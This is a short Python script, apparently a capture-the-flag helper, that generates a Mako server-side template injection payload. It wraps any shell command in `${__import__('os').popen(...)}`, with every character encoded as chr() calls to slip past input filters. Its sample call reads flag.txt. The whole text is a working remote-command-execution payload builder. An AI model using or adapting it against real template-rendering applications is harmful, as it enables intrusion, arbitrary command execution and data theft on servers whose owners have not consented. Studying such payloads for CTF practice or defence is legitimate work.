
def generate_Mako(str_param):
    plain_str = str_param
    pre_cmd = "${__import__(chr(111)+chr(115)).popen("
    post_cmd = ")}"
    pycode = ""

    for code in plain_str:
        pycode += "chr(" + str(ord(code)) + ")+"
    pycode = pycode[:-1]

    ret_pycode = pre_cmd + pycode + post_cmd

    print(ret_pycode)

generate_Mako("cat flag.txt")
